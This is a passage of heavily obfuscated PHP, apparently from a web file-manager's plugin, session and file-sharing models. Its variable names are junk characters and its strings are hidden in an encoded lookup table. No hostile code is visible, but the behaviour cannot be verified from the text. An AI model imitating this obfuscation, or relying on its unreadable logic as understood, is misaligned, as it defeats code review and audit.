$ßôÒûû® =& $_SERVER[¡“ËÌ§œ]; $¼¤Ş´Ş = $this->loadList($Ê¨‰î€ã); if (!$¼¤Ş´Ş) { return !1; } $ãù»™… = $¼¤Ş´Ş[$ßôÒûû®[6]]; if ($¤ÉÓ– == !1) { $ãù»™… = array(); $¤ÉÓ– = $this->getConfigDefault($Ê¨‰î€ã); } foreach ($¤ÉÓ– as $¼İœã¦Ü => $Ï¼†×˜ ) { $ãù»™…[$¼İœã¦Ü] = is_string($Ï¼†×˜ ) ? trim($Ï¼†×˜ ) : $Ï¼†×˜ ; } $this->update($¼¤Ş´Ş[$ßôÒûû®[437]], array($ßôÒûû®[6] => $ãù»™…)); } public function viewList() { $ú–ˆ…Üí =& $_SERVER[¡“ËÌ§œ]; $ÑëÑ˜ÉĞ = $this->loadList(); $this->pluginScan($ÑëÑ˜ÉĞ); $ÑëÑ˜ÉĞ = $this->loadPluginList(); $§§¨áãé = array(); foreach ($ÑëÑ˜ÉĞ as $¥›ô™ => $Ã‰ø“îø) { unset($Ã‰ø“îø[$ú–ˆ…Üí[1972]], $Ã‰ø“îø[$ú–ˆ…Üí[6]]); $™ÓØÓÖ× = PLUGIN_DIR . $Ã‰ø“îø[$ú–ˆ…Üí[32]] . $ú–ˆ…Üí[1974]; if (!is_file($™ÓØÓÖ×)) { continue; } $Ÿ©€©èğ = Hook::apply($Ã‰ø“îø[$ú–ˆ…Üí[32]] . $ú–ˆ…Üí[1982]); if (is_array($Ÿ©€©èğ)) { $§§¨áãé[$¥›ô™] = array_merge($Ã‰ø“îø, $Ÿ©€©èğ); } } return $§§¨áãé; } private function loadPluginList() { $Ñïéƒ÷ =& $_SERVER[¡“ËÌ§œ]; $»Ø¹°ÏÏ = $this->loadList(); if (strtolower(MOD) == $Ñïéƒ÷[1983]) { return $»Ø¹°ÏÏ; } $ôêî®£» = Hook::trigger($Ñïéƒ÷[1984], $»Ø¹°ÏÏ); if ($»Ø¹°ÏÏ && !$ôêî®£») { die; } return $ôêî®£» ? $ôêî®£» : $»Ø¹°ÏÏ; } private function pluginScan($†«±Ş§°) { $¬Ó•€´¿ =& $_SERVER[¡“ËÌ§œ]; recursion_dir(PLUGIN_DIR, $°¼„Ö·°, $¼òë‡°Ä, 0); foreach ($°¼„Ö·° as $–¤Î»æì) { $ŠìˆÖÕ« = get_path_this($–¤Î»æì); if (isset($†«±Ş§°[$ŠìˆÖÕ«]) || !file_exists($–¤Î»æì . $¬Ó•€´¿[1985]) || !file_exists($–¤Î»æì . $¬Ó•€´¿[1974])) { continue; } Hook::apply($ŠìˆÖÕ« . $¬Ó•€´¿[1979]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\145\x6d\x5f\163\145\x73\163\x69\x6f\x6e"; public function get($ò‘ñ‹¶) { $åæûµÊ« =& $_SERVER[¡“ËÌ§œ]; $¾æõø« = $this->where(array($åæûµÊ«[1986] => $ò‘ñ‹¶))->find(); if (!is_array($¾æõø«)) { return !1; } return $¾æõø«[$åæûµÊ«[774]]; } public function set($÷Š¿¤£™, $Œ¡•Ê½ô, $Şšê¢Ùœ = 3600) { $¾ğá×¯’ =& $_SERVER[¡“ËÌ§œ]; $Êï×—Ÿ½ = array($¾ğá×¯’[1986] => $÷Š¿¤£™, $¾ğá×¯’[1890] => $Œ¡•Ê½ô, $¾ğá×¯’[1987] => $Şšê¢Ùœ + time()); if (Session::get($¾ğá×¯’[1988])) { $Êï×—Ÿ½[$¾ğá×¯’[1661]] = Session::get($¾ğá×¯’[1988]); } else { $Êï×—Ÿ½[$¾ğá×¯’[1661]] = 0; } if ($this->get($÷Š¿¤£™)) { return $this->where(array($¾ğá×¯’[1986] => $÷Š¿¤£™))->save($Êï×—Ÿ½); } else { return $this->add($Êï×—Ÿ½, array(), !0); } } public function remove($×ËÉ÷âË) { return $this->where(array($_SERVER[¡“ËÌ§œ][1986] => $×ËÉ÷âË))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¡“ËÌ§œ][1989] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\x65"; protected $dataAuto = array(array("\155\x6f\x64\151\x66\x79\124\x69\x6d\x65", "\x74\151\155\x65", "\151\156\x73\x65\162\164\x2c\165\x70\x64\141\164\x65", "\x66\x75\156\x63\164\151\x6f\156"), array("\143\x72\x65\x61\x74\x65\x54\x69\x6d\x65", "\x74\151\155\145", "\151\156\x73\x65\162\164", "\x66\x75\x6e\143\x74\151\157\x6e"), array("\157\x70\x74\151\x6f\156\163", '', "\151\x6e\x73\145\162\164\x2c\x75\160\x64\141\x74\145\x2c\163\145\154\145\143\x74", "\x6a\163\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($­ŒñÒ¯) { $¿Õ¢ó­ï =& $_SERVER[¡“ËÌ§œ]; $ì ‰È÷¤ = isset($­ŒñÒ¯[0]) ? $­ŒñÒ¯[0] : !1; return array($¿Õ¢ó­ï[1990] => array(USER_ID, $¿Õ¢ó­ï[1991]), $¿Õ¢ó­ï[1931] => array($ì ‰È÷¤, $¿Õ¢ó­ï[1992])); } protected function listSimple() { $É‹û›œÁ = array($_SERVER[¡“ËÌ§œ][1661] => USER_ID); $–­ûÙı¥ = $this->field($this->fieldList)->where($É‹û›œÁ)->select(); return $–­ûÙı¥ ? $–­ûÙı¥ : array(); } protected function getInfo($©Ãğ•ÀÏ, $¡¦¯³Ö = false) { $±öÚË¥ =& $_SERVER[¡“ËÌ§œ]; if ($¡¦¯³Ö) { return $this->_getShareInfo(array($±öÚË¥[631] => $©Ãğ•ÀÏ)); } $³ãÕ£Î = $this->cacheFunctionGet($±öÚË¥[1933], $©Ãğ•ÀÏ); return $³ãÕ£Î; } public function getInfoByHash($²¹üÖ¸) { return $this->_getShareInfo(array($_SERVER[¡“ËÌ§œ][1993] => $²¹üÖ¸)); } public function getInfoByPath($Ùê¦ğªÔ) { $ú‹æ—•” =& $_SERVER[¡“ËÌ§œ]; $ÑÆÓ˜î° = array($ú‹æ—•”[1661] => USER_ID, $ú‹æ—•”[440] => $Ùê¦ğªÔ); return $this->_getShareInfo($ÑÆÓ˜î°); } public function getInfoBySourcePath($¶‡Ï´ŞÔ) { $ö¦¨ö—å =& $_SERVER[¡“ËÌ§œ]; $Î¦Ö¹ÔÅ = array($ö¦¨ö—å[1661] => USER_ID, $ö¦¨ö—å[1195] => $¶‡Ï´ŞÔ); return $this->_getShareInfo($Î¦Ö¹ÔÅ); } private function _getShareInfo($ªÊºòÊÄ) { $úĞÎ¯Ö =& $_SERVER[¡“ËÌ§œ]; $È¯­À = $this->where($ªÊºòÊÄ)->find(); if (!$È¯­À) { return !1; } $ªÊºòÊÄ = array($úĞÎ¯Ö[631] => $È¯­À[$úĞÎ¯Ö[631]]); $¯ˆ„ñÒ¹ = $úĞÎ¯Ö[1994]; $ìÄÉ­®´ = Model($úĞÎ¯Ö[632])->order($úĞÎ¯Ö[437])->field($¯ˆ„ñÒ¹)->where($ªÊºòÊÄ)->select(); if ($È¯­À[$úĞÎ¯Ö[440]] == $úĞÎ¯Ö[198]) { $È¯­À[$úĞÎ¯Ö[87]] = IO::info($È¯­À[$úĞÎ¯Ö[1195]]); } else { $È¯­À[$úĞÎ¯Ö[87]] = Model($úĞÎ¯Ö[1353])->pathInfo($È¯­À[$úĞÎ¯Ö[440]]); } $È¯­À[$úĞÎ¯Ö[1995]] = $ìÄÉ­®´; return $È¯­À; } protected function getInfoAuth($øõ†Ã­Ü) { $¥Æ‰îû =& $_SERVER[¡“ËÌ§œ]; $‹îµ¡®¯ = $this->getInfo($øõ†Ã­Ü); if ($‹îµ¡®¯[$¥Æ‰îû[1661]] == USER_ID) { $‹îµ¡®¯[$¥Æ‰îû[451]] = $‹îµ¡®¯[$¥Æ‰îû[87]][$¥Æ‰îû[451]]; } else { $‹îµ¡®¯[$¥Æ‰îû[451]] = Model($¥Æ‰îû[531])->authMake($‹îµ¡®¯[$¥Æ‰îû[1995]]); } return $‹îµ¡®¯; } protected function listData($Ï¥Öøıû = null, $çï”û = 300) { $íä·ÈÊ =& $_SERVER[¡“ËÌ§œ]; $µ¸¯À¾ò = array(array($íä·ÈÊ[526] => array($íä·ÈÊ[1032], 0), $íä·ÈÊ[629] => array($íä·ÈÊ[1032], 0), $íä·ÈÊ[1996] => $íä·ÈÊ[1949])); if ($Ï¥Öøıû == $íä·ÈÊ[1997]) { $µ¸¯À¾ò = array($íä·ÈÊ[526] => 1); } else { if ($Ï¥Öøıû == $íä·ÈÊ[1181]) { $µ¸¯À¾ò = array($íä·ÈÊ[629] => 1); } } $µ¸¯À¾ò[$íä·ÈÊ[1661]] = USER_ID; $Š¶ƒ• = $this->where($µ¸¯À¾ò)->selectPage($çï”û); return $Š¶ƒ•; } protected function listToMe($½ûæ¨²• = 300) { $èÁ€µ›» =& $_SERVER[¡“ËÌ§œ]; $†Å¥¯‰ = Model($èÁ€µ›»[1998])->userGroupParents(USER_ID); $‘ò¡‡Öã = array($èÁ€µ›»[614] => SourceModel::TYPE_USER, $èÁ€µ›»[534] => USER_ID); if ($†Å¥¯‰) { $‘ò¡‡Öã = array(array($èÁ€µ›»[614] => SourceModel::TYPE_USER, $èÁ€µ›»[534] => USER_ID), array($èÁ€µ›»[614] => SourceModel::TYPE_GROUP, $èÁ€µ›»[534] => array($èÁ€µ›»[7], $†Å¥¯‰)), $èÁ€µ›»[1996] => $èÁ€µ›»[1949]); } $„ˆ×Á€¨ = Model($èÁ€µ›»[632])->where($‘ò¡‡Öã)->selectPage($½ûæ¨²•); $·î©È = array_to_keyvalue_group($„ˆ×Á€¨[$èÁ€µ›»[398]], $èÁ€µ›»[631]); if (!$·î©È) { return $„ˆ×Á€¨; } $úˆó»è± = $èÁ€µ›»[1999]; $‘ò¡‡Öã = array($èÁ€µ›»[631] => array($èÁ€µ›»[456], array_keys($·î©È)), $èÁ€µ›»[1661] => array($èÁ€µ›»[1034], $èÁ€µ›»[198])); $×‡©‚¦‘ = $this->field($úˆó»è±)->where($‘ò¡‡Öã)->select(); foreach ($×‡©‚¦‘ as $¸”Å—á => &$€ÓÎçå) { $€ÓÎçå[$èÁ€µ›»[1995]] = $·î©È[$€ÓÎçå[$èÁ€µ›»[631]]]; } unset($€ÓÎçå); $®Ùè¨ˆ¡ = array($èÁ€µ›»[2000] => $×‡©‚¦‘, $èÁ€µ›»[2001] => $„ˆ×Á€¨[$èÁ€µ›»[395]]); return $®Ùè¨ˆ¡; } protected function shareAdd($®˜˜ªÌª, $±Áœ‚ô¢) { $Ãîéº =& $_SERVER[¡“ËÌ§œ]; $˜éÇ´¾¾ = $this->_addShareData($®˜˜ªÌª, $±Áœ‚ô¢); if (!empty($±Áœ‚ô¢[$Ãîéº[2002]])) { $this->_shareAuthSet($˜éÇ´¾¾, $±Áœ‚ô¢[$Ãîéº[2002]]); } $this->shareEventAdd($®˜˜ªÌª, $±Áœ‚ô¢, $Ãîéº[2003]); return $˜éÇ´¾¾; } protected function shareAddSystem($Ã÷¡û, $ëêßÍ³ö) { $èŠË×‡² =& $_SERVER[¡“ËÌ§œ]; $ò÷âã‹ = $this->_addShareData($Ã÷¡û, $ëêßÍ³ö, $èŠË×‡²[1307]); $this->_shareAuthSet($ò÷âã‹, $ëêßÍ³ö[$èŠË×‡²[2002]]); return $ò÷âã‹; } private function shareEventAdd($ë¢«Â™­, $áÂ¬­‘, $Ö±’ÁúÍ = "\x61\144\144") { $µşàã¥¾ =& $_SERVER[¡“ËÌ§œ]; if (!$ë¢«Â™­ || $ë¢«Â™­ == $µşàã¥¾[198]) { return; } if ($Ö±’ÁúÍ == $µşàã¥¾[2003]) { if ($áÂ¬­‘[$µşàã¥¾[526]] == $µşàã¥¾[88]) { Model($µşàã¥¾[599])->eventShare($ë¢«Â™­, $µşàã¥¾[2004]); } if ($áÂ¬­‘[$µşàã¥¾[629]] == $µşàã¥¾[88]) { Model($µşàã¥¾[599])->eventShare($ë¢«Â™­, $µşàã¥¾[2005]); } return; } $ìÃñœÖ = $this->getInfoByPath($ë¢«Â™­); $€³Â·ı = $µşàã¥¾[2006]; if ($ìÃñœÖ[$µşàã¥¾[526]] == $µşàã¥¾[198] && $áÂ¬­‘[$µşàã¥¾[526]] == $µşàã¥¾[88]) { $€³Â·ı = $µşàã¥¾[2004]; } if ($ìÃñœÖ[$µşàã¥¾[526]] == $µşàã¥¾[88] && $áÂ¬­‘[$µşàã¥¾[526]] == $µşàã¥¾[198]) { $€³Â·ı = $µşàã¥¾[2007]; } if ($ìÃñœÖ[$µşàã¥¾[629]] == $µşàã¥¾[198] && $áÂ¬­‘[$µşàã¥¾[629]] == $µşàã¥¾[88]) { $€³Â·ı = $µşàã¥¾[2005]; } if ($ìÃñœÖ[$µşàã¥¾[629]] == $µşàã¥¾[88] && $áÂ¬­‘[$µşàã¥¾[629]] == $µşàã¥¾[198]) { $€³Â·ı = $µşàã¥¾[2008]; } Model($µşàã¥¾[599])->eventShare($ë¢«Â™­, $€³Â·ı); return; } private function _addShareData($åúˆâ°ƒ, $ğÑ·Ù†¢ = array(), $†¹µİÒë = false) { $‹ÒˆïÎ— =& $_SERVER[¡“ËÌ§œ]; $™…üÄ = $†¹µİÒë == $‹ÒˆïÎ—[1307] ? 0 : USER_ID; $°ú—À¸× = array($‹ÒˆïÎ—[455] => $åúˆâ°ƒ, $‹ÒˆïÎ—[1652] => $™…üÄ); if ($åúˆâ°ƒ == 0) { $°ú—À¸× = array($‹ÒˆïÎ—[2009] => $ğÑ·Ù†¢[$‹ÒˆïÎ—[1195]], $‹ÒˆïÎ—[1652] => $™…üÄ); } if ($ìÅÏÀÓ¾ = $this->where($°ú—À¸×)->find()) { return $ìÅÏÀÓ¾[$‹ÒˆïÎ—[631]]; } if ($åúˆâ°ƒ == 0) { $¨®í–½´ = array($‹ÒˆïÎ—[32] => get_path_this($ğÑ·Ù†¢[$‹ÒˆïÎ—[84]])); } else { $¨®í–½´ = Model($‹ÒˆïÎ—[845])->sourceInfo($åúˆâ°ƒ); if (!$¨®í–½´) { return !1; } } if (!$ğÑ·Ù†¢[$‹ÒˆïÎ—[1559]]) { $ğÑ·Ù†¢[$‹ÒˆïÎ—[1559]] = $¨®í–½´[$‹ÒˆïÎ—[32]]; } $çÙ±ªˆ· = array($‹ÒˆïÎ—[1652] => $™…üÄ, $‹ÒˆïÎ—[455] => $åúˆâ°ƒ, $‹ÒˆïÎ—[1559] => $‹ÒˆïÎ—[12], $‹ÒˆïÎ—[526] => 0, $‹ÒˆïÎ—[629] => 0, $‹ÒˆïÎ—[1195] => $‹ÒˆïÎ—[12], $‹ÒˆïÎ—[336] => $‹ÒˆïÎ—[12], $‹ÒˆïÎ—[909] => $‹ÒˆïÎ—[12], $‹ÒˆïÎ—[2010] => 0, $‹ÒˆïÎ—[2011] => 0, $‹ÒˆïÎ—[781] => 0, $‹ÒˆïÎ—[2012] => $‹ÒˆïÎ—[12], $‹ÒˆïÎ—[1993] => $‹ÒˆïÎ—[12]); $˜÷·Ó®‰ = explode($‹ÒˆïÎ—[50], $‹ÒˆïÎ—[2013]); foreach ($˜÷·Ó®‰ as $Ïôİ‚¥) { if (!isset($ğÑ·Ù†¢[$Ïôİ‚¥])) { continue; } $çÙ±ªˆ·[$Ïôİ‚¥] = $ğÑ·Ù†¢[$Ïôİ‚¥]; } $ÑŞ´èÏÆ = $this->add($çÙ±ªˆ·); $áÓˆëœå = array($‹ÒˆïÎ—[1993] => short_id($ÑŞ´èÏÆ)); $this->where(array($‹ÒˆïÎ—[2014] => $ÑŞ´èÏÆ))->save($áÓˆëœå); return $ÑŞ´èÏÆ; } private function _shareAuthSet($‘•…ŞÌ­, $¼Êû¤î‰) { $àáÊ‰ô¡ =& $_SERVER[¡“ËÌ§œ]; if (!is_array($¼Êû¤î‰)) { return !1; } $éÁŸ×Ş­ = Model($àáÊ‰ô¡[1959]); $éÁŸ×Ş­->where(array($àáÊ‰ô¡[631] => $‘•…ŞÌ­))->delete(); $áôĞû» = array(); foreach ($¼Êû¤î‰ as $Ô”ó¬ãø) { $¡ÚÒ†˜ñ = SourceModel::TYPE_USER; if ($Ô”ó¬ãø[$àáÊ‰ô¡[449]] == SourceModel::TYPE_GROUP) { $¡ÚÒ†˜ñ = SourceModel::TYPE_GROUP; } $ı¦­è­¸ = array($àáÊ‰ô¡[631] => $‘•…ŞÌ­, $àáÊ‰ô¡[449] => $¡ÚÒ†˜ñ, $àáÊ‰ô¡[534] => intval($Ô”ó¬ãø[$àáÊ‰ô¡[534]]), $àáÊ‰ô¡[1955] => 0, $àáÊ‰ô¡[2015] => -1); if ($Ô”ó¬ãø[$àáÊ‰ô¡[1955]]) { $ı¦­è­¸[$àáÊ‰ô¡[1955]] = $Ô”ó¬ãø[$àáÊ‰ô¡[1955]]; } else { if ($Ô”ó¬ãø[$àáÊ‰ô¡[2015]]) { $ı¦­è­¸[$àáÊ‰ô¡[2015]] = $Ô”ó¬ãø[$àáÊ‰ô¡[2015]]; } } $áôĞû»[] = $ı¦­è­¸; } return $éÁŸ×Ş­->addAll($áôĞû», array(), !0); } public function numViewAdd($”ã¹“Ê ) { $ıš½¡ÃÄ =& $_SERVER[¡“ËÌ§œ]; $ğ‡ ™¥Ù = array($ıš½¡ÃÄ[2014] => $”ã¹“Ê ); $this->where($ğ‡ ™¥Ù)->setAdd($ıš½¡ÃÄ[2010]); } public function numDownloadAdd($ÊĞ÷Îéû) { $åÍ×Çìë =& $_SERVER[¡“ËÌ§œ]; $“Ü”–Á = array($åÍ×Çìë[2014] => $ÊĞ÷Îéû); $this->where($“Ü”–Á)->setAdd($åÍ×Çìë[2011]); } protected function shareEdit($ŸÕÌú¼›, $ş¼‰Ö¸Î) { $ËÍ—§Š¾ =& $_SERVER[¡“ËÌ§œ]; $óĞ©Äò = $this->getInfo($ŸÕÌú¼›); if (!$óĞ©Äò) { return !1; } $this->_checkLinkShare($ş¼‰Ö¸Î, $óĞ©Äò); $ã¨¥€‹™ = array(); $¢öÁŸ£É = explode($ËÍ—§Š¾[50], $ËÍ—§Š¾[2016]); foreach ($¢öÁŸ£É as $˜óïÒŒò) { if (!array_key_exists($˜óïÒŒò, $ş¼‰Ö¸Î)) { continue; } $ã¨¥€‹™[$˜óïÒŒò] = $ş¼‰Ö¸Î[$˜óïÒŒò]; } $this->shareEventAdd($óĞ©Äò[$ËÍ—§Š¾[440]], $ş¼‰Ö¸Î, $ËÍ—§Š¾[1821]); $this->where(array($ËÍ—§Š¾[2014] => $ŸÕÌú¼›))->save($ã¨¥€‹™); if (isset($ş¼‰Ö¸Î[$ËÍ—§Š¾[2002]])) { $this->_shareAuthSet($ŸÕÌú¼›, $ş¼‰Ö¸Î[$ËÍ—§Š¾[2002]]); } return !0; } private function _checkLinkShare($£œÌéé, $³©Àğè) { $İÑƒ–”õ =& $_SERVER[¡“ËÌ§œ]; if ($£œÌéé[$İÑƒ–”õ[526]] != $İÑƒ–”õ[88]) { return; } $àƒ¸î± = $³©Àğè[$İÑƒ–”õ[87]][$İÑƒ–”õ[440]]; if ($³©Àğè[$İÑƒ–”õ[87]][$İÑƒ–”õ[33]] != $İÑƒ–”õ[200]) { $£Ï¥§Ø‘ = $this->_folderReport($àƒ¸î±); if (!$£Ï¥§Ø‘) { return; } show_json(LNG($İÑƒ–”õ[2017]) . $İÑƒ–”õ[2018] . $£Ï¥§Ø‘, !1); } $³ìå¦» = Model($İÑƒ–”õ[845])->fileInfoGet($³©Àğè[$İÑƒ–”õ[87]][$İÑƒ–”õ[440]]); if (!$³ìå¦») { return; } $Í•öÎ¸ƒ = $this->shareFileMeta($³ìå¦»[$İÑƒ–”õ[506]]); if (isset($Í•öÎ¸ƒ[$İÑƒ–”õ[403]]) && $Í•öÎ¸ƒ[$İÑƒ–”õ[403]] == $İÑƒ–”õ[88]) { show_json(LNG($İÑƒ–”õ[2019]), !1); } } private function _folderReport($”¯¾ÎŞ) { $î™ªŒûõ =& $_SERVER[¡“ËÌ§œ]; $ä¡Øó¶Ü = array($î™ªŒûõ[506] => array($î™ªŒûõ[1032], 0), $î™ªŒûõ[770] => 3); $Ğç«Ø’€ = Model($î™ªŒûõ[2020])->where($ä¡Øó¶Ü)->field($î™ªŒûõ[506])->select(); if (!$Ğç«Ø’€) { return !1; } $Ğç«Ø’€ = array_to_keyvalue($Ğç«Ø’€, $î™ªŒûõ[12], $î™ªŒûõ[506]); $’ëûÎŞã = $î™ªŒûõ[50] . $”¯¾ÎŞ . $î™ªŒûõ[50]; $ä¡Øó¶Ü = array($î™ªŒûõ[506] => array($î™ªŒûõ[7], $Ğç«Ø’€), $î™ªŒûõ[549] => array($î™ªŒûõ[412], "\x25{$’ëûÎŞã}\45"), $î™ªŒûõ[469] => 0); $Ğñ™Ê¹Ô = Model($î™ªŒûõ[845])->where($ä¡Øó¶Ü)->field($î™ªŒûõ[2021])->find(); if (!$Ğñ™Ê¹Ô) { return !1; } $Ë÷–êÑ­ = substr($Ğñ™Ê¹Ô[$î™ªŒûõ[549]], strpos($Ğñ™Ê¹Ô[$î™ªŒûõ[549]], $’ëûÎŞã)); $ä¡Øó¶Ü = array($î™ªŒûõ[440] => array($î™ªŒûõ[7], trim($Ë÷–êÑ­, $î™ªŒûõ[50]))); $üîûœºº = Model($î™ªŒûõ[845])->where($ä¡Øó¶Ü)->field($î™ªŒûõ[32])->select(); $ˆ‚¬¨¾÷ = array_to_keyvalue($üîûœºº, $î™ªŒûõ[12], $î™ªŒûõ[32]); $ˆ‚¬¨¾÷[] = $Ğñ™Ê¹Ô[$î™ªŒûõ[32]]; return implode($î™ªŒûõ[8], $ˆ‚¬¨¾÷); } protected function remove($õÆªû½ç) { $Êü‹õ€ä =& $_SERVER[¡“ËÌ§œ]; if (is_array($õÆªû½ç)) { $õÆªû½ç = array($Êü‹õ€ä[7], $õÆªû½ç); } $Â°¥´´ë = array($Êü‹õ€ä[631] => $õÆªû½ç); $Üã…ÚŸğ = $this->where($Â°¥´´ë)->delete(); if ($Üã…ÚŸğ) { Model($Êü‹õ€ä[632])->where(array($Êü‹õ€ä[631] => $õÆªû½ç))->delete(); } $ñ£Êú¤À = is_array($õÆªû½ç) ? $õÆªû½ç[1] : array($õÆªû½ç); for ($Ú‹€òËŸ = 0; $Ú‹€òËŸ < count($ñ£Êú¤À); $Ú‹€òËŸ++) { $Ò™ƒö¡ = $this->getInfo($ñ£Êú¤À[$Ú‹€òËŸ]); if ($Ò™ƒö¡[$Êü‹õ€ä[629]] == $Êü‹õ€ä[88]) { Model($Êü‹õ€ä[599])->eventShare($Ò™ƒö¡[$Êü‹õ€ä[440]], $Êü‹õ€ä[2008]); } if ($Ò™ƒö¡[$Êü‹õ€ä[526]] == $Êü‹õ€ä[88]) { Model($Êü‹õ€ä[599])->eventShare($Ò™ƒö¡[$Êü‹õ€ä[440]], $Êü‹õ€ä[2007]); } } return $Üã…ÚŸğ; } protected function removeBySource($Õç€ãŒÊ) { $â¹ëóïŞ =& $_SERVER[¡“ËÌ§œ]; $äÉÂ = array($â¹ëóïŞ[455] => array($â¹ëóïŞ[456], $Õç€ãŒÊ)); $ñö‹˜ó¶ = $this->field($â¹ëóïŞ[631])->where($äÉÂ)->select(); $ñö‹˜ó¶ = array_to_keyvalue($ñö‹˜ó¶, $â¹ëóïŞ[12], $â¹ëóïŞ[631]); if (!$ñö‹˜ó¶) { return; } $äÉÂ = array($â¹ëóïŞ[2014] => array($â¹ëóïŞ[456], $ñö‹˜ó¶)); $this->where($äÉÂ)->delete(); Model($â¹ëóïŞ[632])->where($äÉÂ)->delete(); } public function listAll($Ä«Ùìƒ) { $±¾í¢´ =& $_SERVER[¡“ËÌ§œ]; $ã”‚»‚œ = array(); if ($Ä«Ùìƒ[$±¾í¢´[1661]]) { $ã”‚»‚œ[$±¾í¢´[1661]] = $Ä«Ùìƒ[$±¾í¢´[1661]]; } if ($Ä«Ùìƒ[$±¾í¢´[780]]) { $Ñ¤Šœå = $Ä«Ùìƒ[$±¾í¢´[781]] ? $Ä«Ùìƒ[$±¾í¢´[781]] : strtotime(date($±¾í¢´[2022])); $ã”‚»‚œ[$±¾í¢´[201]] = array($±¾í¢´[362], array($Ä«Ùìƒ[$±¾í¢´[780]], $Ñ¤Šœå)); } if ($Ä«Ùìƒ[$±¾í¢´[33]]) { $ã”‚»‚œ[$Ä«Ùìƒ[$±¾í¢´[33]]] = 1; } else { $ã”‚»‚œ[] = array($±¾í¢´[526] => array($±¾í¢´[1032], 0), $±¾í¢´[629] => array($±¾í¢´[1032], 0), $±¾í¢´[1996] => $±¾í¢´[1949]); } if ($Ä«Ùìƒ[$±¾í¢´[1945]]) { $ã”‚»‚œ[] = array($±¾í¢´[1993] => $Ä«Ùìƒ[$±¾í¢´[1945]], $±¾í¢´[1559] => array($±¾í¢´[412], "\x25{$Ä«Ùìƒ[$±¾í¢´[1945]]}\x25"), $±¾í¢´[1996] => $±¾í¢´[1949]); } $Ø²ò·ëŒ = $this->_makeOrder()->where($ã”‚»‚œ)->selectPage(20); if (empty($Ø²ò·ëŒ[$±¾í¢´[398]])) { return array(); } $this->_listDataApply($Ø²ò·ëŒ[$±¾í¢´[398]]); return $Ø²ò·ëŒ; } public function listDataApply($€‹ß¯©¥) { $this->_listDataApply($€‹ß¯©¥); return $€‹ß¯©¥; } private function _listDataApply(&$ü”§¸§) { $ìÊÇƒøç =& $_SERVER[¡“ËÌ§œ]; $åìõ¨ß = array_to_keyvalue($ü”§¸§, $ìÊÇƒøç[12], $ìÊÇƒøç[1661]); $„‹åÂ”ì = Model($ìÊÇƒøç[563])->userListInfo(array_unique($åìõ¨ß)); $ïõÙ¿€ó = array_to_keyvalue($ü”§¸§, $ìÊÇƒøç[12], $ìÊÇƒøç[440]); $áÓ­ãÈ = Model($ìÊÇƒøç[845])->sourceListInfo($ïõÙ¿€ó, !0); foreach ($ü”§¸§ as $üÒÛ›¯Ò => &$¨Šü¸¡œ) { $ÆŸ€ã‚ò = $¨Šü¸¡œ[$ìÊÇƒøç[1661]]; $¨Šü¸¡œ[$ìÊÇƒøç[2023]] = $„‹åÂ”ì[$ÆŸ€ã‚ò] ? $„‹åÂ”ì[$ÆŸ€ã‚ò] : !1; $ÍâŸŞÖ— = $¨Šü¸¡œ[$ìÊÇƒøç[440]]; $¨Šü¸¡œ[$ìÊÇƒøç[87]] = $áÓ­ãÈ[$ÍâŸŞÖ—] ? $áÓ­ãÈ[$ÍâŸŞÖ—] : !1; if ($¨Šü¸¡œ[$ìÊÇƒøç[87]][$ìÊÇƒøç[469]] == $ìÊÇƒøç[88]) { unset($ü”§¸§[$üÒÛ›¯Ò]); } if ($¨Šü¸¡œ[$ìÊÇƒøç[87]] != $ìÊÇƒøç[198] && !$¨Šü¸¡œ[$ìÊÇƒøç[87]]) { unset($ü”§¸§[$üÒÛ›¯Ò]); } } unset($¨Šü¸¡œ); $ü”§¸§ = array_values($ü”§¸§); } private function _makeOrder($ü³îÇ½õ = '') { $¨ô·”®ª =& $_SERVER[¡“ËÌ§œ]; $Ñ‡¹‘Şª = array($¨ô·”®ª[201], $¨ô·”®ª[781], $¨ô·”®ª[2010], $¨ô·”®ª[2011]); $£Ì“Î²› = array($¨ô·”®ª[488] => $¨ô·”®ª[489], $¨ô·”®ª[490] => $¨ô·”®ª[491]); $­”†Ê = Input::get($¨ô·”®ª[495], $¨ô·”®ª[7], $¨ô·”®ª[461], $Ñ‡¹‘Şª); $ğ•ŒøÄ“ = Input::get($¨ô·”®ª[496], $¨ô·”®ª[7], $¨ô·”®ª[2024], array($¨ô·”®ª[1942], $¨ô·”®ª[490])); $ğ•ŒøÄ“ = $£Ì“Î²›[$ğ•ŒøÄ“]; $ü³îÇ½õ = $ü³îÇ½õ . "{$­”†Ê}\40{$ğ•ŒøÄ“}"; return $this->order($ü³îÇ½õ); } public function reportAdd($ßõÏ‚ğç) { $Ã´ÀÙ¤ =& $_SERVER[¡“ËÌ§œ]; $ ¤é‰ñó = array($Ã´ÀÙ¤[631] => $ßõÏ‚ğç[$Ã´ÀÙ¤[631]], $Ã´ÀÙ¤[1661] => USER_ID); if (Model($Ã´ÀÙ¤[2020])->where($ ¤é‰ñó)->find()) { return !1; } $—ÄèõõÊ = array($Ã´ÀÙ¤[631] => $ßõÏ‚ğç[$Ã´ÀÙ¤[631]], $Ã´ÀÙ¤[1559] => $ßõÏ‚ğç[$Ã´ÀÙ¤[1559]], $Ã´ÀÙ¤[440] => $ßõÏ‚ğç[$Ã´ÀÙ¤[440]], $Ã´ÀÙ¤[506] => $ßõÏ‚ğç[$Ã´ÀÙ¤[506]], $Ã´ÀÙ¤[1661] => USER_ID, $Ã´ÀÙ¤[33] => $ßõÏ‚ğç[$Ã´ÀÙ¤[33]], $Ã´ÀÙ¤[491] => $ßõÏ‚ğç[$Ã´ÀÙ¤[491]]); return Model($Ã´ÀÙ¤[2020])->add($—ÄèõõÊ); } public function reportList($á‰ÑÍÍƒ) { $›ú…ºÇª =& $_SERVER[¡“ËÌ§œ]; $êòµ”ÏÇ = array(); if ($á‰ÑÍÍƒ[$›ú…ºÇª[780]]) { $¡Éå¨²ï = $á‰ÑÍÍƒ[$›ú…ºÇª[781]] ? $á‰ÑÍÍƒ[$›ú…ºÇª[781]] : strtotime(date($›ú…ºÇª[2022])); $êòµ”ÏÇ[$›ú…ºÇª[201]] = array($›ú…ºÇª[362], array($á‰ÑÍÍƒ[$›ú…ºÇª[780]], $¡Éå¨²ï)); } if (isset($á‰ÑÍÍƒ[$›ú…ºÇª[33]]) && in_array($á‰ÑÍÍƒ[$›ú…ºÇª[33]], array($›ú…ºÇª[88], $›ú…ºÇª[475], $›ú…ºÇª[2025], 